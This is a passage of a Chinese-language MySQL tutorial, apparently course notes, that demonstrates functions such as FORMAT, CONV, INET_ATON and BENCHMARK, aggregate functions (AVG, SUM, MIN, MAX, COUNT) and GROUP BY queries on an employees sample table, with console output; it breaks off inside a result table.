<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 其他函数</span><br><span class="line">mysql<span class="operator">&gt;</span> # 如果n的值小于或者等于<span class="number">0</span>，则只保留整数部分</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> FORMAT(<span class="number">123.125</span>, <span class="number">2</span>),FORMAT(<span class="number">123.125</span>, <span class="number">0</span>),FORMAT(<span class="number">123.125</span>, <span class="number">-2</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> FORMAT(<span class="number">123.125</span>, <span class="number">2</span>) <span class="operator">|</span> FORMAT(<span class="number">123.125</span>, <span class="number">0</span>) <span class="operator">|</span> FORMAT(<span class="number">123.125</span>, <span class="number">-2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">123.13</span>             <span class="operator">|</span> <span class="number">123</span>                <span class="operator">|</span> <span class="number">123</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONV(<span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>), CONV(<span class="number">8888</span>,<span class="number">10</span>,<span class="number">16</span>), CONV(<span class="keyword">NULL</span>, <span class="number">10</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+------------------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> CONV(<span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>) <span class="operator">|</span> CONV(<span class="number">8888</span>,<span class="number">10</span>,<span class="number">16</span>) <span class="operator">|</span> CONV(<span class="keyword">NULL</span>, <span class="number">10</span>, <span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+------------------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10000</span>           <span class="operator">|</span> <span class="number">22</span>B8             <span class="operator">|</span> <span class="keyword">NULL</span>              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+------------------+-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 以“<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>”为例，计算方式为<span class="number">192</span>乘以<span class="number">256</span>的<span class="number">3</span>次方，加上<span class="number">168</span>乘以<span class="number">256</span>的<span class="number">2</span>次方，加上<span class="number">1</span>乘以<span class="number">256</span>，再加上<span class="number">100</span>。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> INET_ATON(<span class="string">&#x27;192.168.1.100&#x27;</span>),INET_NTOA(<span class="number">3232235876</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+-----------------------+</span></span><br><span class="line"><span class="operator">|</span> INET_ATON(<span class="string">&#x27;192.168.1.100&#x27;</span>) <span class="operator">|</span> INET_NTOA(<span class="number">3232235876</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+-----------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">3232235876</span> <span class="operator">|</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+-----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> # BENCHMARK()用于测试表达式的执行效率</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> BENCHMARK(<span class="number">100000</span>,MD5(<span class="string">&#x27;mysql&#x27;</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> BENCHMARK(<span class="number">100000</span>,MD5(<span class="string">&#x27;mysql&#x27;</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                              <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # <span class="keyword">CONVERT</span>():可以实现字符集的转换</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> CHARSET(<span class="string">&#x27;atguigu&#x27;</span>),CHARSET(<span class="keyword">CONVERT</span>(<span class="string">&#x27;atguigu&#x27;</span> <span class="keyword">USING</span> <span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> CHARSET(<span class="string">&#x27;atguigu&#x27;</span>) <span class="operator">|</span> CHARSET(<span class="keyword">CONVERT</span>(<span class="string">&#x27;atguigu&#x27;</span> <span class="keyword">USING</span> <span class="string">&#x27;gbk&#x27;</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> gbk                <span class="operator">|</span> gbk                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.04</span> sec)</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="八、聚合函数"><a href="#八、聚合函数" class="headerlink" title="八、聚合函数"></a>八、聚合函数</h1><h2 id="1-聚合函数介绍"><a href="#1-聚合函数介绍" class="headerlink" title="1. 聚合函数介绍"></a>1. 聚合函数介绍</h2><ul>
<li><strong>什么是聚合函数</strong></li>
</ul>
<p>聚合函数作用于一组数据，并对一组数据返回一个值。</p>
<ul>
<li><strong>聚合函数类型</strong></li>
</ul>
<blockquote>
<p><code>AVG()</code><br><code>SUM()</code><br><code>MAX()</code><br><code>MIN()</code><br><code>COUNT()</code></p>
</blockquote>
<ul>
<li><strong>聚合函数语法</strong></li>
<li><strong>聚合函数不能嵌套调用。比如不能出现类似<code>AVG(SUM(字段名称))</code>形式的调用。</strong></li>
</ul>
<h3 id="（1）AVG和SUM函数"><a href="#（1）AVG和SUM函数" class="headerlink" title="（1）AVG和SUM函数"></a>（1）AVG和SUM函数</h3><p>可以对&#x3D;&#x3D;数值型数据&#x3D;&#x3D;使用AVG 和 SUM 函数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary),<span class="built_in">SUM</span>(salary),<span class="built_in">AVG</span>(salary) <span class="operator">*</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">AVG</span>(salary) <span class="operator">|</span> <span class="built_in">SUM</span>(salary) <span class="operator">|</span> <span class="built_in">AVG</span>(salary) <span class="operator">*</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6461.682243</span> <span class="operator">|</span>   <span class="number">691400.00</span> <span class="operator">|</span>          <span class="number">691400.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 如下的操作没有意义</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">SUM</span>(last_name),<span class="built_in">AVG</span>(last_name),<span class="built_in">SUM</span>(hire_date)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+----------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">SUM</span>(last_name) <span class="operator">|</span> <span class="built_in">AVG</span>(last_name) <span class="operator">|</span> <span class="built_in">SUM</span>(hire_date) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+----------------+----------------+</span></span><br><span class="line"><span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>     <span class="number">2136929701</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+----------------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">214</span> warnings (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h3 id="（2）MIN和MAX函数"><a href="#（2）MIN和MAX函数" class="headerlink" title="（2）MIN和MAX函数"></a>（2）MIN和MAX函数</h3><p>可以对&#x3D;&#x3D;任意数据类型&#x3D;&#x3D;的数据使用 MIN 和 MAX 函数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # MAX <span class="operator">/</span> MIN :适用于数值类型、字符串类型、日期时间类型的字段（或变量）</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">MAX</span>(salary),<span class="built_in">MIN</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">MAX</span>(salary) <span class="operator">|</span> <span class="built_in">MIN</span>(salary) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">24000.00</span> <span class="operator">|</span>     <span class="number">2100.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">MAX</span>(last_name),<span class="built_in">MIN</span>(last_name),<span class="built_in">MAX</span>(hire_date),<span class="built_in">MIN</span>(hire_date)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+----------------+----------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">MAX</span>(last_name) <span class="operator">|</span> <span class="built_in">MIN</span>(last_name) <span class="operator">|</span> <span class="built_in">MAX</span>(hire_date) <span class="operator">|</span> <span class="built_in">MIN</span>(hire_date) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+----------------+----------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> Zlotkey        <span class="operator">|</span> Abel           <span class="operator">|</span> <span class="number">2000</span><span class="number">-04</span><span class="number">-21</span>     <span class="operator">|</span> <span class="number">1987</span><span class="number">-06</span><span class="number">-17</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+----------------+----------------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h3 id="（3）COUNT函数"><a href="#（3）COUNT函数" class="headerlink" title="（3）COUNT函数"></a>（3）COUNT函数</h3><ul>
<li><code>COUNT(*)</code>返回表中记录总数，适用于任意数据类型。</li>
<li><code>COUNT(expr)</code> 返回<code>expr</code>不为空的记录总数。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 计算指定字段在查询结构中出现的个数（不包含<span class="keyword">NULL</span>值的）</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(employee_id),<span class="built_in">COUNT</span>(salary),<span class="built_in">COUNT</span>(<span class="number">2</span> <span class="operator">*</span> salary),<span class="built_in">COUNT</span>(<span class="number">1</span>),<span class="built_in">COUNT</span>(<span class="number">2</span>),<span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees ;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+---------------+-------------------+----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">COUNT</span>(employee_id) <span class="operator">|</span> <span class="built_in">COUNT</span>(salary) <span class="operator">|</span> <span class="built_in">COUNT</span>(<span class="number">2</span> <span class="operator">*</span> salary) <span class="operator">|</span> <span class="built_in">COUNT</span>(<span class="number">1</span>) <span class="operator">|</span> <span class="built_in">COUNT</span>(<span class="number">2</span>) <span class="operator">|</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+---------------+-------------------+----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">107</span> <span class="operator">|</span>           <span class="number">107</span> <span class="operator">|</span>               <span class="number">107</span> <span class="operator">|</span>      <span class="number">107</span> <span class="operator">|</span>      <span class="number">107</span> <span class="operator">|</span>      <span class="number">107</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+---------------+-------------------+----------+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 如果计算表中有多少条记录，如何实现？</span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">1</span>：<span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">2</span>：<span class="built_in">COUNT</span>(<span class="number">1</span>)</span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">3</span>：<span class="built_in">COUNT</span>(具体字段) : 不一定对！</span><br><span class="line">mysql<span class="operator">&gt;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> # 注意：计算指定字段出现的个数时，是不计算<span class="keyword">NULL</span>值的。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> commission_pct <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">35</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(commission_pct)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">COUNT</span>(commission_pct) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span>                    <span class="number">35</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # AVG <span class="operator">=</span> SUM <span class="operator">/</span> COUNT</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary), <span class="built_in">SUM</span>(salary)<span class="operator">/</span><span class="built_in">COUNT</span>(salary),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="built_in">AVG</span>(commission_pct),<span class="built_in">SUM</span>(commission_pct)<span class="operator">/</span><span class="built_in">COUNT</span>(commission_pct),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="built_in">SUM</span>(commission_pct)<span class="operator">/</span><span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------------------------+---------------------+-------------------------------------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">AVG</span>(salary) <span class="operator">|</span> <span class="built_in">SUM</span>(salary)<span class="operator">/</span><span class="built_in">COUNT</span>(salary) <span class="operator">|</span> <span class="built_in">AVG</span>(commission_pct) <span class="operator">|</span> <span class="built_in">SUM</span>(commission_pct)<span class="operator">/</span><span class="built_in">COUNT</span>(commission_pct) <span class="operator">|</span> <span class="built_in">SUM</span>(commission_pct)<span class="operator">/</span><span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------------------------+---------------------+-------------------------------------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6461.682243</span> <span class="operator">|</span>               <span class="number">6461.682243</span> <span class="operator">|</span>            <span class="number">0.222857</span> <span class="operator">|</span>                                  <span class="number">0.222857</span> <span class="operator">|</span>                     <span class="number">0.072897</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------------------------+---------------------+-------------------------------------------+------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询公司中平均奖金率</span><br><span class="line">mysql<span class="operator">&gt;</span> # 错误的！</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(commission_pct)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">AVG</span>(commission_pct) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">0.222857</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 正确的：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">SUM</span>(commission_pct) <span class="operator">/</span> <span class="built_in">COUNT</span>(IFNULL(commission_pct,<span class="number">0</span>)),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="built_in">AVG</span>(IFNULL(commission_pct,<span class="number">0</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------+-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">SUM</span>(commission_pct) <span class="operator">/</span> <span class="built_in">COUNT</span>(IFNULL(commission_pct,<span class="number">0</span>)) <span class="operator">|</span> <span class="built_in">AVG</span>(IFNULL(commission_pct,<span class="number">0</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------+-------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                              <span class="number">0.072897</span> <span class="operator">|</span>                      <span class="number">0.072897</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------+-------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>如何需要统计表中的记录数，使用COUNT(*)、COUNT(1)、COUNT(具体字段) 哪个效率更高呢？</li>
<li>如果使用的是<code>MyISAM</code> 存储引擎，则三者效率相同，都是O(1)</li>
<li>如果使用的是<code>InnoDB</code> 存储引擎，则三者效率：<code>COUNT(*) = COUNT(1) &gt; COUNT(字段)</code></li>
</ul>
</blockquote>
<h2 id="2-GROUP-BY"><a href="#2-GROUP-BY" class="headerlink" title="2. GROUP BY"></a>2. GROUP BY</h2><h3 id="（1）基本使用"><a href="#（1）基本使用" class="headerlink" title="（1）基本使用"></a>（1）基本使用</h3><p>可以使用GROUP BY子句将表中的数据分成若干组</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, group_function(<span class="keyword">column</span>)</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">table</span></span><br><span class="line">[<span class="keyword">WHERE</span> <span class="keyword">condition</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> group_by_expression]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span>];</span><br><span class="line"></span><br><span class="line"># 明确：<span class="keyword">WHERE</span>一定放在<span class="keyword">FROM</span>后面</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询各个部门的平均工资，最高工资</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id, <span class="built_in">AVG</span>(salary), <span class="built_in">SUM</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span> <span class="built_in">AVG</span>(salary)  <span class="operator">|</span> <span class="built_in">SUM</span>(salary) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>  <span class="number">7000.000000</span> <span class="operator">|</span>     <span class="number">7000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">10</span> <span class="operator">|</span>  <span class="number">4400.000000</span> <span class="operator">|</span>     <span class="number">4400.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span>  <span class="number">9500.000000</span> <span class="operator">|</span>    <span class="number">19000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span>  <span class="number">4150.000000</span> <span class="operator">|</span>    <span class="number">24900.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">40</span> <span class="operator">|</span>  <span class="number">6500.000000</span> <span class="operator">|</span>     <span class="number">6500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span>  <span class="number">3475.555556</span> <span class="operator">|</span>   <span class="number">156400.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">60</span> <span class="operator">|</span>  <span class="number">5760.000000</span> <span class="operator">|</span>    <span class="number">28800.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">70</span> <span class="operator">|</span> <span class="number">10000.000000</span> <span class="operator">|</span>    <span class="number">10000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">80</span> <span class="operator">|</span>  <span class="number">8955.882353</span> <span class="operator">|</span>   <span class="number">304500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span> <span class="number">19333.333333</span> <span class="operator">|</span>    <span class="number">58000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">100</span> <span class="operator">|</span>  <span class="number">8600.000000</span> <span class="operator">|</span>    <span class="number">51600.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span> <span class="number">10150.000000</span> <span class="operator">|</span>    <span class="number">20300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+-------------+</span></span><br><span class="line"><span class="number">12</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询各个工作的平均工资</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> job_id, <span class="built_in">AVG</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> job_id;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> job_id     <span class="operator">|</span> <span class="built_in">AVG</span>(salary)  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> AC_ACCOUNT <span class="operator">|</span>  <span class="number">8300.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AC_MGR     <span class="operator">|</span> <span class="number">12000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AD_ASST    <span class="operator">|</span>  <span class="number">4400.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AD_PRES    <span class="operator">|</span> <span class="number">24000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AD_VP      <span class="operator">|</span> <span class="number">17000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FI_ACCOUNT <span class="operator">|</span>  <span class="number">7920.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FI_MGR     <span class="operator">|</span> <span class="number">12000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HR_REP     <span class="operator">|</span>  <span class="number">6500.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> IT_PROG    <span class="operator">|</span>  <span class="number">5760.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MK_MAN     <span class="operator">|</span> <span class="number">13000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MK_REP     <span class="operator">|</span>  <span class="number">6000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PR_REP     <span class="operator">|</span> <span class="number">10000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PU_CLERK   <span class="operator">|</span>  <span class="number">2780.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PU_MAN     <span class="operator">|</span> <span class="number">11000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SA_MAN     <span class="operator">|</span> <span class="number">12200.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SA_REP     <span class="operator">|</span>  <span class="number">8350.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SH_CLERK   <span class="operator">|</span>  <span 